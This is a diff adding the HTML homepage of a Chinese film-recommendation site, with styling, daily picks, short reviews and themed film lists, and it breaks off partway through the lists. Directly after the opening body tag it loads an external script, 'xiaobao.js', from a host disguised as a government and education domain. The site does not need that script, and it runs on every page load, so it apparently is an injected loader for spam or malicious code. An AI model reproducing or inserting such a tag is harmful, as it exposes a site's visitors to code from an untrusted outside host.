@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>贵妃电影网｜一斛珠，一段情，一部值得慢看的老电影</title>
+<meta name="description" content="贵妃电影网，以盛唐审美看电影。宫闱、权谋、爱情、舞蹈、华服、古典——用东方美学挑片、写影评、做片单。每晚一部，慢看，细品。">
+<meta name="keywords" content="贵妃电影网,贵妃,电影,影视,华语古装,宫斗,历史,爱情,华语电影,电影推荐,影评,片单,戏曲">
+<link rel="canonical" href="https://guifeiwangdianyingwang-cn.github.io">
+<meta name="theme-color" content="#fbf3e6">
+<style>
+:root{
+  --silk:#fbf3e6;      /* 绢 */
+  --silk-d:#f3e6d0;
+  --ink:#241c1a;       /* 墨 */
+  --sub:#7a655c;
+  --line:#e8d3b8;
+  --car:#b23a3a;       /* 胭脂 */
+  --car-d:#8e2727;
+  --gold:#c6922f;      /* 描金 */
+  --jade:#6b8f78;      /* 青玉 */
+  --plum:#8c5a6a;      /* 藕荷 */
+  --shadow:0 12px 30px -18px rgba(140,60,60,.45);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"Songti SC","SimSun","Noto Serif CJK SC","Source Han Serif SC","WenQuanYi Micro Hei",serif;
+  background:var(--silk);color:var(--ink);line-height:1.92;
+  background-image:
+    radial-gradient(circle at 6% 4%, rgba(178,58,58,.13), transparent 46%),
+    radial-gradient(circle at 96% 12%, rgba(198,146,47,.16), transparent 42%),
+    repeating-linear-gradient(0deg, rgba(140,90,60,.030) 0 1px, transparent 1px 44px),
+    repeating-linear-gradient(90deg, rgba(140,90,60,.030) 0 1px, transparent 1px 44px);
+  background-attachment:fixed;
+  overflow-x:clip;
+}
+::selection{background:var(--car);color:#fff}
+a{color:inherit;text-decoration:none;outline:none}
+ul,ol{list-style:none}
+img{max-width:100%;display:block}
+:focus-visible{outline:2px dashed var(--car);outline-offset:4px}
+
+/* ============ 顶部印章 ============ */
+.seal{position:fixed;right:16px;bottom:16px;z-index:80;width:56px;height:56px;border-radius:10px;background:var(--car);color:#fff;display:grid;place-items:center;font:900 15px/1 "Songti SC",serif;letter-spacing:0;box-shadow:inset 0 -4px 8px rgba(90,20,20,.35),0 8px 18px rgba(140,40,40,.34);transform:rotate(-7deg)}
+@media(max-width:720px){.seal{width:44px;height:44px;font-size:12px;right:10px;bottom:10px}}
+
+/* ============ HEADER ============ */
+header{position:sticky;top:0;z-index:60;background:rgba(251,243,230,.94);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.hwrap{max-width:1200px;margin:0 auto;padding:11px 24px;display:flex;align-items:center;gap:14px}
+.logo{display:flex;align-items:center;gap:11px;flex:none}
+.fan{width:40px;height:25px;flex:none;position:relative;transform:rotate(-6deg)}
+.fan i{position:absolute;inset:0;background:
+  radial-gradient(circle at 30% 18%, rgba(255,255,255,.34), transparent 40%),
+  conic-gradient(from 200deg at 20% 92%, #e8b96a 0 8%, #c96a4a 8% 16%, #e8b96a 16% 24%, #c96a4a 24% 32%, #e8b96a 32% 40%, #c96a4a 40% 48%, #e8b96a 48% 56%, #c96a4a 56% 64%, #e8b96a 64% 72%, #c96a4a 72% 80%, #e8b96a 80% 88%, #c96a4a 88% 96%, #e8b96a 96%);
+  clip-path:polygon(0 100%,20% 12%,40% 0,60% 0,80% 12%,100% 100%);
+  box-shadow:inset 0 3px 0 rgba(255,255,255,.5)}
+.fan::after{content:"";position:absolute;left:20%;right:20%;bottom:0;height:3px;background:var(--gold);border-radius:99px}
+.logo b{font-size:clamp(1.16rem,2.8vw,1.44rem);font-weight:900;letter-spacing:2px}
+.logo .en{font:600 8.6px/1 ui-monospace,Menlo,monospace;letter-spacing:2.2px;color:var(--sub);font-family:ui-monospace,Menlo,monospace}
+nav{display:flex;gap:2px;margin-left:auto;align-items:center}
+nav a{font-size:13.8px;padding:8px 11px;border-radius:8px;color:var(--sub);font-weight:600;transition:.2s;white-space:nowrap;letter-spacing:.5px}
+nav a:hover{color:var(--car);background:rgba(178,58,58,.1)}
+.menu-btn{display:none;width:42px;height:42px;border:1px solid var(--line);border-radius:11px;background:#fff;cursor:pointer;flex:none;align-items:center;justify-content:center;flex-direction:column;gap:5px}
+.menu-btn i{width:17px;height:2px;background:var(--car);transition:.25s;border-radius:99px}
+@media(max-width:900px){
+  nav{position:fixed;inset:0 0 0 auto;width:min(84vw,340px);background:#fdf6ea;flex-direction:column;align-items:stretch;padding:74px 16px 24px;transform:translateX(102%);transition:.34s cubic-bezier(.4,0,.2,1);z-index:70;border-left:1px solid var(--line)}
+  nav.open{transform:none}
+  nav a{padding:14px 15px;font-size:16px;border-bottom:1px dashed var(--line)}
+  .menu-btn{display:flex;margin-left:auto}
+  body.lock{overflow:hidden}
+}
+
+/* ============ HERO ============ */
+.hero{max-width:1200px;margin:0 auto;padding:clamp(18px,6vw,46px) 24px 24px;display:grid;grid-template-columns:1fr .9fr;gap:28px;align-items:center}
+.kicker{display:inline-flex;align-items:center;gap:9px;font:700 10.4px/1 ui-monospace,Menlo,monospace;letter-spacing:2.4px;color:var(--car);border:1px solid rgba(178,58,58,.45);border-radius:6px;padding:7px 13px;background:rgba(178,58,58,.08)}
+.hero h1{font-size:clamp(1.9rem,5.4vw,3.7rem);line-height:1.16;font-weight:900;letter-spacing:1px;margin-top:15px}
+.hero h1 em{font-style:normal;color:var(--car)}
+.hero .sub{margin-top:15px;color:#6b574e;font-size:clamp(14px,1.6vw,15.6px);max-width:54ch}
+.hero .cta{margin-top:22px;display:flex;flex-wrap:wrap;gap:12px}
+.btn{font:700 14.4px/1 "Songti SC","Microsoft YaHei",sans-serif;padding:13px 25px;border-radius:8px;border:1px solid transparent;cursor:pointer;transition:.22s;letter-spacing:1px}
+.btn.p{background:var(--car);color:#fff;box-shadow:0 8px 20px -10px var(--car)}
+.btn.p:hover{filter:brightness(1.08);transform:translateY(-2px)}
+.btn.g{background:transparent;border-color:var(--line);color:var(--ink)}
+.btn.g:hover{border-color:var(--car);color:var(--car)}
+
+/* 团扇 */
+.fanart{position:relative;height:clamp(250px,31vw,356px);display:flex;align-items:center;justify-content:center}
+.fanart .disc{position:absolute;width:clamp(214px,27vw,308px);height:clamp(214px,27vw,308px);border-radius:50%;background:
+  radial-gradient(circle at 34% 26%, rgba(255,255,255,.26), transparent 42%),
+  linear-gradient(150deg,#f6ddb4 0 40%,#e6b98a 40% 68%,#c98a5e 68%);
+  box-shadow:inset 0 8px 22px rgba(255,255,255,.55),inset 0 -14px 24px rgba(140,80,40,.4),0 16px 34px -14px rgba(140,70,40,.5);
+  animation:sp 26s linear infinite}
+.fanart .disc::before{content:"";position:absolute;inset:9%;border-radius:50%;border:2px solid rgba(140,60,60,.55)}
+.fanart .disc::after{content:"";position:absolute;inset:9%;border-radius:50%;background:
+  repeating-linear-gradient(0deg, rgba(140,60,60,.16) 0 1px, transparent 1px 16px),
+  repeating-linear-gradient(90deg, rgba(140,60,60,.16) 0 1px, transparent 1px 16px)}
+.fanart .hub{position:absolute;width:26px;height:26px;border-radius:50%;background:radial-gradient(circle at 36% 32%,#f6ddb4,var(--gold));z-index:5;box-shadow:0 0 0 6px rgba(198,146,47,.2)}
+.fanart .tt{position:absolute;z-index:6;text-align:center;color:#7a2a25;font-weight:900;letter-spacing:4px;line-height:1.9;writing-mode:vertical-rl;font-size:clamp(15px,2.2vw,19px);text-shadow:0 1px 0 rgba(255,255,255,.6)}
+@keyframes sp{to{transform:rotate(360deg)}}
+@media(max-width:900px){.hero{grid-template-columns:1fr;gap:14px}.fanart .tt{font-size:15px}}
+
+/* ============ SECTION ============ */
+section{padding:clamp(28px,6vw,54px) 0;border-top:1px solid var(--line)}
+.wrap{max-width:1200px;margin:0 auto;padding:0 24px}
+.sh{display:flex;align-items:flex-end;gap:12px;flex-wrap:wrap;margin-bottom:5px}
+.sh .no{font:900 10.2px/1 ui-monospace,Menlo,monospace;letter-spacing:2.1px;color:var(--car);border:1px solid rgba(178,58,58,.45);border-radius:6px;padding:7px 11px;height:fit-content;background:rgba(178,58,58,.08)}
+.sh h2{font-size:clamp(1.4rem,3.5vw,2.06rem);font-weight:900;letter-spacing:.6px}
+.sh .en{font:600 10.2px/1 ui-monospace,Menlo,monospace;letter-spacing:2.5px;color:var(--sub);margin-bottom:7px}
+.lead{color:#6b574e;font-size:clamp(13.5px,1.6vw,15px);max-width:66ch;margin-bottom:24px}
+
+/* ============ ① 每日片单 —— 竖向卡片（grid auto-fill）============ */
+.deck{display:grid;grid-template-columns:repeat(auto-fill,minmax(214px,1fr));gap:15px}
+.dk{border-radius:13px;overflow:hidden;position:relative;transition:.26s;box-shadow:var(--shadow);background:#fff}
+.dk:hover{transform:translateY(-6px)}
+.dk .cv{aspect-ratio:3/4;position:relative;padding:15px;display:flex;flex-direction:column;justify-content:flex-end;color:#fff}
+.dk .cv::before{content:"";position:absolute;inset:0;background:inherit;filter:brightness(.92)}
+.dk .cv i{position:absolute;inset:0;background:
+  radial-gradient(circle at 80% 16%, rgba(255,255,255,.24), transparent 40%),
+  radial-gradient(circle at 12% 88%, rgba(60,20,20,.36), transparent 46%)}
+.dk:nth-child(1) .cv{background:linear-gradient(158deg,#e7c9a0,#c98a5e)}
+.dk:nth-child(2) .cv{background:linear-gradient(158deg,#d9b8c4,#a86a78)}
+.dk:nth-child(3) .cv{background:linear-gradient(158deg,#e9d8a6,#c6a24a)}
+.dk:nth-child(4) .cv{background:linear-gradient(158deg,#c9d6d2,#7e9c90)}
+.dk:nth-child(5) .cv{background:linear-gradient(158deg,#dcc9cf,#b07a86)}
+.dk:nth-child(6) .cv{background:linear-gradient(158deg,#e2d3ba,#a88a5e)}
+.dk .yr{position:relative;font:800 10.2px/1 ui-monospace,Menlo,monospace;letter-spacing:1.7px;background:rgba(255,255,255,.24);border:1px solid rgba(255,255,255,.5);border-radius:6px;padding:5px 9px;align-self:flex-start;backdrop-filter:blur(3px)}
+.dk h3{position:relative;font-size:1.2rem;font-weight:900;letter-spacing:1px;line-height:1.42;margin-top:8px;text-shadow:0 2px 10px rgba(40,15,15,.3)}
+.dk p{position:relative;font-size:12.3px;line-height:1.7;color:rgba(255,255,255,.95);margin-top:6px}
+.dk .mt{position:absolute;top:12px;right:12px;font:700 9.6px/1 ui-monospace,Menlo,monospace;letter-spacing:1.2px;color:#fff;background:rgba(120,30,30,.5);border-radius:6px;padding:5px 8px;z-index:3}
+
+/* ============ ② 华服色谱 —— 横向条形占比 ============ */
+.bars{display:flex;flex-direction:column;gap:12px}
+.br{display:grid;grid-template-columns:118px 1fr 62px;gap:13px;align-items:center;padding:9px 12px;border-radius:11px;background:#fff;border:1px solid var(--line);transition:.22s}
+.br:hover{border-color:var(--car);box-shadow:var(--shadow)}
+.br .nm{font-weight:800;letter-spacing:1px;font-size:14.4px}
+.br .nm small{display:block;font:600 9.6px/1 ui-monospace,Menlo,monospace;letter-spacing:1.8px;color:var(--sub);margin-top:4px}
+.track{height:15px;border-radius:99px;background:rgba(232,211,184,.55);overflow:hidden}
+.fill{height:100%;border-radius:99px;width:0;background:linear-gradient(90deg,var(--car),var(--gold));box-shadow:inset 0 2px 5px rgba(255,255,255,.3);transition:width 1.2s cubic-bezier(.2,.8,.2,1)}
+.br:nth-child(2) .fill{background:linear-gradient(90deg,#a86a78,#c6922f)}
+.br:nth-child(3) .fill{background:linear-gradient(90deg,#7e9c90,#c6922f)}
+.br:nth-child(4) .fill{background:linear-gradient(90deg,#c6a24a,#e0c076)}
+.br:nth-child(5) .fill{background:linear-gradient(90deg,#8c5a6a,#c6922f)}
+.br:nth-child(6) .fill{background:linear-gradient(90deg,#5f8aa0,#9bb8c8)}
+.pc{font:800 13px/1 ui-monospace,Menlo,monospace;letter-spacing:.8px;color:var(--car);text-align:right}
+
+/* ============ ③ 深度影评 —— 竖排题签卡 ============ */
+.notes{display:grid;grid-template-columns:repeat(auto-fit,minmax(282px,1fr));gap:16px}
+.nt{position:relative;padding:20px 18px 18px;border-radius:13px;background:#fff;border:1px solid var(--line);transition:.24s;display:flex;flex-direction:column;box-shadow:var(--shadow)}
+.nt::before{content:"";position:absolute;left:0;top:14px;bottom:14px;width:5px;background:var(--car);border-radius:0 99px 99px 0}
+.nt:hover{transform:translateY(-5px);border-color:var(--car)}
+.nt.n2::before{background:var(--plum)}
+.nt.n3::before{background:var(--jade)}
+.nt .k{font:700 10.2px/1 ui-monospace,Menlo,monospace;letter-spacing:2.4px;color:var(--car)}
+.nt h3{font-size:1.14rem;font-weight:900;margin:9px 0 8px;letter-spacing:.6px;line-height:1.5}
+.nt p{font-size:13.2px;color:#5f4c43}
+.nt .ft{margin-top:auto;padding-top:12px;border-top:1px dashed var(--line);display:flex;align-items:center;gap:9px;font:600 10.4px/1 ui-monospace,Menlo,monospace;letter-spacing:1.4px;color:var(--sub)}
+.nt .ft .av{width:22px;height:22px;border-radius:50%;background:var(--gold);color:#fff;display:grid;place-items:center;font:800 10.4px/1 ui-monospace,Menlo,monospace}
+
+/* ============ ④ 主题片单 —— 原生手风琴 + 有序片单 ============ */
+.acc{display:flex;flex-direction:column;gap:10px}
+details.lst{border:1px solid var(--line);border-radius:14px;background:#fff;overflow:hidden;transition:.22s}
+details.lst[open]{border-color:rgba(178,58,58,.6);box-shadow:var(--shadow)}
+details.lst>summary{cursor:pointer;padding:15px 20px;display:flex;align-items:center;gap:13px;list-style:none;user-select:none}
+details.lst>summary::-webkit-details-marker{display:none}
+details.lst>summary::after{content:"＋";margin-left:auto;font-size:19px;color:var(--sub);transition:.25s;font-weight:700}
+details.lst[open]>summary::after{content:"－";transform:rotate(180deg);color:var(--car)}
+details.lst>summary .ix{flex:none;width:46px;height:46px;border-radius:9px;display:grid;place-items:center;font:900 12.4px/1 ui-monospace,Menlo,monospace;color:#fff;background:var(--car);transform:rotate(-5deg)}
+details.lst:nth-child(2)>summary .ix{background:var(--plum)}
+details.lst:nth-child(3)>summary .ix{background:#c6922f}
+details.lst:nth-child(4)>summary .ix{background:var(--jade)}
+details.lst:nth-child(5)>summary .ix{background:#8a6f4a}
+details.lst:nth-child(6)>summary .ix{background:#5f8aa0}
+details.lst>summary h3{font-size:clamp(.97rem,2vw,1.15rem);font-weight:800;flex:1;letter-spacing:.6px}
+details.lst>summary .cnt{font:600 10.5px/1 ui-monospace,Menlo,monospace;color:var(--sub);border:1px solid var(--line);border-radius:6px;padding:6px 10px;flex:none}
+.lst ol{padding:2px 20px 17px 77px;counter-reset:film;display:flex;flex-direction:column;gap:7px}
+.lst ol li{font-size:13.2px;color:#6b574e;display:flex;gap:10px;align-items:baseline;border-bottom:1px dashed var(--line);padding-bottom:7px}
+.lst ol li::before{counter-increment:film;content:"GF " counter(film,decimal-leading-zero);font:700 10px/1 ui-monospace,Menlo,monospace;color:var(--car);border:1px solid var(--line);border-radius:5px;padding:4px 6px;flex:none;letter-spacing:.5px}
+.lst ol li b{color:var(--ink);font-weight:700}
+.lst ol li em{font-style:normal;margin-left:auto;font:600 11px/1 ui-monospace,Menlo,monospace;color:var(--sub);flex:none}
+@media(max-width:700px){.lst ol{padding-left:17px}details.lst>summary .cnt{display:none}}
+
+/* ============ ⑤ 观影指南 —— 印章步骤卡 ============ */
+.guide{display:grid;grid-template-columns:repeat(auto-fit,minmax(248px,1fr));gap:15px}
+.gd{position:relative;padding:17px 17px 22px;border:1px solid var(--line);border-radius:13px;background:#fff;transition:.24s;overflow:hidden}
+.gd::after{content:"";position:absolute;right:14px;top:14px;width:34px;height:34px;border:2px solid var(--car);border-radius:7px;color:var(--car);display:grid;place-items:center;font:900 9.6px/1 "Songti SC",serif;letter-spacing:0;transform:rotate(6deg);opacity:.82}
+.gd:nth-child(1)::after{content:"慢"}
+.gd:nth-child(2)::after{content:"静"}
+.gd:nth-child(3)::after{content:"一"}
+.gd:nth-child(4)::after{content:"二"}
+.gd:nth-child(5)::after{content:"字"}
+.gd:nth-child(6)::after{content:"重"}
+.gd:hover{transform:translateY(-4px);border-color:var(--car);box-shadow:var(--shadow)}
+.gd .st{font:800 10.2px/1 ui-monospace,Menlo,monospace;letter-spacing:2.4px;color:var(--car);margin-top:4px}
+.gd h3{font-size:1.06rem;font-weight:900;margin:8px 0 7px;letter-spacing:.6px}
+.gd p{font-size:13px;color:#6b574e}
+.gd .no{position:absolute;right:8px;bottom:-18px;font:900 3.1rem/1 ui-monospace,Menlo,monospace;color:rgba(198,146,47,.18);pointer-events:none;letter-spacing:-2px}
+
+/* ============ FOOTER ============ */
+footer{border-top:1px solid var(--line);padding:36px 0 22px;margin-top:12px}
+.foot{max-width:1200px;margin:0 auto;padding:0 24px;display:grid;grid-template-columns:1.3fr 1fr 1fr;gap:26px}
+@media(max-width:840px){.foot{grid-template-columns:1fr 1fr;gap:20px}.foot .f1{grid-column:1/-1}}
+.foot h4{font:800 10.4px/1 ui-monospace,Menlo,monospace;letter-spacing:2.4px;color:var(--sub);margin-bottom:11px}
+.foot p,.foot a{font-size:13px;color:#6b574e}
+.foot a{display:block;padding:5px 0}
+.foot a:hover{color:var(--car)}
+.flogo{display:flex;align-items:center;gap:11px}
+.copy{margin-top:23px;padding-top:15px;border-top:1px dashed var(--line);color:var(--sub);font-size:11.5px;display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between;grid-column:1/-1;font-family:ui-monospace,Menlo,monospace;letter-spacing:.2px;line-height:1.9}
+.kw{color:var(--car);font-weight:700}
+
+/* ============ 浮现 ============ */
+.rv{opacity:0;transform:translateY(16px);transition:opacity .64s cubic-bezier(.2,.7,.3,1),transform .64s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:none}
+@media(prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto}
+  .rv{opacity:1;transform:none;transition:none}
+  .fanart .disc{animation:none}
+  .dk,.nt,.gd,.br{transform:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div class="seal" aria-hidden="true">贵妃</div>
+
+<header>
+  <div class="hwrap">
+    <a class="logo" href="#top" aria-label="返回顶部">
+      <span class="fan" aria-hidden="true"><i></i></span>
+      <span><b>贵妃电影网</b><span class="en">GUI · FEI · CINEMA</span></span>
+    </a>
+    <button class="menu-btn" id="mb" aria-label="切换导航菜单" aria-expanded="false" aria-controls="nav">
+      <i></i><i></i><i></i>
+    </button>
+    <nav id="nav" aria-label="主导航">
+      <a href="#pick">今日片单</a>
+      <a href="#hue">华服色谱</a>
+      <a href="#note">深度影评</a>
+      <a href="#list">主题片单</a>
+      <a href="#guide">观影指南</a>
+    </nav>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- HERO -->
+  <section class="hero" aria-labelledby="h1">
+    <div class="rv">
+      <span class="kicker">◆ 以盛唐之眼，看今人之情 ◆</span>
+      <h1>一斛珠，一段情，<br>一部值得<em>慢看</em>的老电影。</h1>
+      <p class="sub">贵妃电影网，一个讲<b>“贵妃”</b>的电影站。宫闱、权谋、爱情、舞蹈、华服、古典——用东方美学挑片、写影评、做片单。不追热搜，不刷榜单，只挑那些经得起反复看的影像。</p>
+      <div class="cta">
+        <a class="btn p" href="#pick">今晚，看这部</a>
+        <a class="btn g" href="#list">阅主题片单</a>
+      </div>
+    </div>
+
+    <div class="fanart rv" role="img" aria-label="一把旋转的团扇，扇面为绢色格纹，中心题贵妃二字">
+      <div class="disc" aria-hidden="true"></div>
+      <div class="hub" aria-hidden="true"></div>
+      <div class="tt">贵妃<br>电影</div>
+    </div>
+  </section>
+
+  <!-- ① 今日片单 -->
+  <section id="pick" aria-labelledby="t1">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">壹</span>
+        <div>
+          <div class="en">TODAY · 今日片单</div>
+          <h2 id="t1">今日 6 部：华服之下，都是人心</h2>
+        </div>
+      </div>
+      <p class="lead">每天 6 部。筛选标准只有一条：<b>一年后，你还记得那个画面</b>。不看热度，不看新鲜，只看它有没有“余味”。</p>
+
+      <div class="deck">
+        <article class="dk rv" aria-label="霸王别姬">
+          <span class="mt">CLASSIC</span>
+          <div class="cv"><i aria-hidden="true"></i>
+            <span class="yr">1993 · 陈凯歌</span>
+            <h3>霸王别姬</h3>
+            <p>“说的是一辈子，差一年、一个月、一天、一个时辰，都不算一辈子。”张国荣之后，再无程蝶衣。</p>
+          </div>
+        </article>
+        <article class="dk rv" aria-label="大明宫词">
+          <span class="mt">COSTUME</span>
+          <div class="cv"><i aria-hidden="true"></i>
+            <span class="yr">2000 · 李少红</span>
+            <h3>大明宫词</h3>
+            <p>太平公主第一次见到薛绍，是在上元节的面具之下。台词的华丽，至今无人能及。</p>
+          </div>
+        </article>
+        <article class="dk rv" aria-label="卧虎藏龙">
+          <span class="mt">WUXIA</span>
+          <div class="cv"><i aria-hidden="true"></i>
+            <span class="yr">2000 · 李安</span>
+            <h3>卧虎藏龙</h3>
+            <p>竹林那场戏，是华语电影最美的“想说而不能说”。武侠的外壳，讲的全是克制。</p>
+          </div>
+        </article>
+        <article class="dk rv" aria-label="刺客聂隐娘">
+          <span class="mt">ART</span>
+          <div class="cv"><i aria-hidden="true"></i>
+            <span class="yr">2015 · 侯孝贤</span>
+            <h3>刺客聂隐娘</h3>
+            <p>一个人，一匹马，一片雾。侯孝贤用最慢的镜头，拍最狠的决断。</p>
+          </div>
+        </article>
+        <article class="dk rv" aria-label="大红灯笼高高挂">
+          <span class="mt">PALACE</span>
+          <div class="cv"><i aria-hidden="true"></i>
+            <span class="yr">1991 · 张艺谋</span>
+            <h3>大红灯笼高高挂</h3>
+            <p>四房太太，一盏灯笼。乔家大院的红，是压死人的红。</p>
+          </div>
+        </article>
+        <article class="dk rv" aria-label="一代宗师">
+          <span class="mt">MASTER</span>
+          <div class="cv"><i aria-hidden="true"></i>
+            <span class="yr">2013 · 王家卫</span>
+            <h3>一代宗师</h3>
+            <p>“念念不忘，必有回响。”王家卫把功夫拍成了情书，把遗憾拍成了史诗。</p>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ② 华服色谱 -->
+  <section id="hue" aria-labelledby="t2">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">贰</span>
+        <div>
+          <div class="en">COLOR · 华服色谱</div>
+          <h2 id="t2">片单的六种颜色：不是类型，是情绪</h2>
+        </div>
+      </div>
+      <p class="lead">不按类型归档，按<b>“那一抹颜色”</b>归档。颜色，是电影最诚实的情绪。</p>
+
+      <div class="bars">
+        <div class="br rv"><span class="nm">胭脂红<small>宫闱 · 权谋</small></span><span class="track"><span class="fill" data-w="30"></span></span><span class="pc">30%</span></div>
+        <div class="br rv"><span class="nm">藕荷紫<small>爱情 · 情欲</small></span><span class="track"><span class="fill" data-w="22"></span></span><span class="pc">22%</span></div>
+        <div class="br rv"><span class="nm">青玉绿<small>山水 · 留白</small></span><span class="track"><span class="fill" data-w="18"></span></span><span class="pc">18%</span></div>
+        <div class="br rv"><span class="nm">描金黄<small>历史 · 史诗</small></span><span class="track"><span class="fill" data-w="14"></span></span><span class="pc">14%</span></div>
+        <div class="br rv"><span class="nm">绢本米<small>家庭 · 日常</small></span><span class="track"><span class="fill" data-w="10"></span></span><span class="pc">10%</span></div>
+        <div class="br rv"><span class="nm">烟灰蓝<small>戏曲 · 人生</small></span><span class="track"><span class="fill" data-w="6"></span></span><span class="pc">6%</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ③ 深度影评 -->
+  <section id="note" aria-labelledby="t3">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">叁</span>
+        <div>
+          <div class="en">EDITORIAL · 深度影评</div>
+          <h2 id="t3">三篇不讨好的影评</h2>
+        </div>
+      </div>
+      <p class="lead">我们不写“神作”“封神”“必看”。只问三件事：她为什么这样选？电影凭什么替她说？看完，你能为她多做一件事吗。</p>
+
+      <div class="notes">
+        <article class="nt n1 rv">
+          <span class="k">EDITORIAL · 壹</span>
+          <h3>贵妃为何只能是悲剧：权力从来不给女人留退路</h3>
+          <p>从《长生殿》到《妖猫传》，每一次重述都在问同一个问题：一个被捧到最高的女人，有没有资格说“不”？答案几乎总是没有。</p>
+          <p>华语电影里最动人的“贵妃”，往往不是主角，而是那个站在权力边缘、连悲伤都要挑时辰的女人。《大红灯笼高高挂》里的颂莲、《大明宫词》里的韦后、《甄嬛传》里的华妃——她们的共同点不是野心，是<b>没有退出权</b>。</p>
+          <div class="ft"><span class="av" aria-hidden="true">贵</span><span>2026.10.09 ｜ 宫闱叙事</span></div>
+        </article>
+        <article class="nt n2 rv">
+          <span class="k">EDITORIAL · 贰</span>
+          <h3>华服是盔甲，也是牢笼</h3>
+          <p>我们看古装片，最先记住的往往是颜色：乔家大院的红、紫禁城的金、竹林的青、雪原的白。服装不是装饰，是<b>社会给一个人划定的位置</b>。</p>
+          <p>《刺客聂隐娘》里，聂隐娘的衣裳几乎没有花纹，因为她已经不属于任何门第；《一代宗师》里，宫二的旗袍越换越素，因为她把一生都花在“报仇”这一件事上。好电影的服装，是在替人物做减法。</p>
+          <div class="ft"><span class="av" aria-hidden="true">衣</span><span>2026.09.28 ｜ 服装语言</span></div>
+        </article>
+        <article class="nt n3 rv">
+          <span class="k">EDITORIAL · 叁</span>
+          <h3>慢，是这个时代最奢侈的观影方式</h3>
+          <p>侯孝贤的镜头要等，是枝裕和的镜头要坐，李安的镜头要忍。这些导演有一个共同点：<b>他们不急着告诉你答案</b>。</p>
+          <p>所以本站片单的排序依据是“余味”，不是评分。建议：关灯，手机翻过去，一次看完。若中途走神，就倒回去重看那三分钟——好电影值得被这样对待。看完，别急着说话，等它自己沉下去。</p>
+          <div class="ft"><span class="av" aria-hidden="true">慢</span><span>2026.09.19 ｜ 观影方法</span></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ④ 主题片单 -->
+  <section id="list" aria-labelledby="t4">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">肆</span>
+        <div>
+          <div class="en">PLAYLIST · 主题片单</div>
+          <h2 id="t4">六个“她”的片单：36 部，按心境挑</h2>
+        </div>
+      </div>
+      <p class="lead">片单共 36 部，按<b>“此刻想要什么”</b>归档，而不是按类型。点开看清单与时间戳。</p>
+
+      <div class="acc">
+        <details class="lst rv" open>
+          <summary><span class="ix">GF01</span><h3>宫闱：最华丽的牢笼</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《大红灯笼高高挂》</b>“四房太太，一盏灯笼。乔家大院的红，是压死人的红。”<em>01:02</em></li>
+            <li><b>《大明宫词》</b>太平公主第一次见到薛绍，是在上元节的面具之下。<em>00:38</em></li>
+            <li><b>《甄嬛传》</b>“臣妾做不到啊。”——华语剧集里最狠的宫斗，是把真心一寸寸磨掉。<em>18:20</em></li>
+            <li><b>《如懿传》</b>从“如懿”到“卫嬿婉”，最残忍的是那句“兰因絮果”。<em>22:05</em></li>
+            <li><b>《延禧攻略》</b>魏璎珞的“黑化”，是全网第一次为“不委屈自己”鼓掌。<em>09:14</em></li>
+            <li><b>《末代皇帝》</b>贝托鲁奇用紫禁城的门，框住了一个人的一生。<em>02:44</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">GF02</span><h3>爱情：说出口的，都不是最深的</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《霸王别姬》</b>“说的是一辈子。”张国荣之后，再无程蝶衣。<em>02:48</em></li>
+            <li><b>《卧虎藏龙》</b>竹林那场戏，是华语电影最美的“想说而不能说”。<em>01:16</em></li>
+            <li><b>《花样年华》</b>“如果多一张船票，你会不会跟我走？”<em>00:54</em></li>
+            <li><b>《一代宗师》</b>宫二与叶问，一场没开始的爱情，成了一生的仪式。<em>01:42</em></li>
+            <li><b>《情书》</b>藤井树，是两个人的名字，也是一场错过。<em>01:08</em></li>
+            <li><b>《色，戒》</b>李安把“背叛”拍成了一个女人的心跳。<em>02:32</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">GF03</span><h3>权谋：棋盘上，没有赢家</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《大明王朝 1566》</b>“长江水清，黄河水浊。”国产历史剧的天花板。<em>03:15</em></li>
+            <li><b>《雍正王朝》</b>唐国强演活了那个“累死在龙椅上”的皇帝。<em>14:22</em></li>
+            <li><b>《走向共和》</b>“一代人有一代人的责任。”被低估的史诗。<em>21:40</em></li>
+            <li><b>《纸牌屋》</b>Underwood 夫妇的每一次对视，都是一次算计。<em>06:08</em></li>
+            <li><b>《权力的游戏》</b>“When you play the game of thrones, you win or you die.”<em>19:02</em></li>
+            <li><b>《赤壁》</b>吴宇森把三国拍成了一首关于“选择”的长诗。<em>01:24</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">GF04</span><h3>华服：衣裳即身份</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《刺客聂隐娘》</b>侯孝贤用最慢的镜头，拍最狠的决断。<em>00:42</em></li>
+            <li><b>《妖猫传》</b>陈凯歌把盛唐画成了梦，也画成了执念。<em>02:06</em></li>
+            <li><b>《十面埋伏》</b>章子怡那支“仙人指路”，是华语电影最美的舞蹈。<em>01:14</em></li>
+            <li><b>《英雄》</b>张艺谋用颜色讲叙事：红、蓝、白、黑。<em>01:48</em></li>
+            <li><b>《无极》</b>“真正的速度是看不见的。”被骂了二十年，值得重看。<em>02:20</em></li>
+            <li><b>《青蛇》</b>徐克让两条蛇，穿上了最华丽的欲望。<em>01:36</em></li>
